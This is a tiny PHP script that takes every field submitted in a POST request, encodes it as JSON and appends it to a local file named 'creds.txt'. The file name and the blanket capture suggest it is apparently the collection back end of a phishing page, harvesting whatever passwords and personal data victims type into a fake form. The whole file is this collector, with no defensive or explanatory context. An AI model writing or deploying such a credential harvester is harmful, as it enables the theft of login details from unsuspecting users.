<?php
if(!empty($_POST)) {
	$j = json_encode($_POST);
	file_put_contents('creds.txt', $j, FILE_APPEND);
}
?>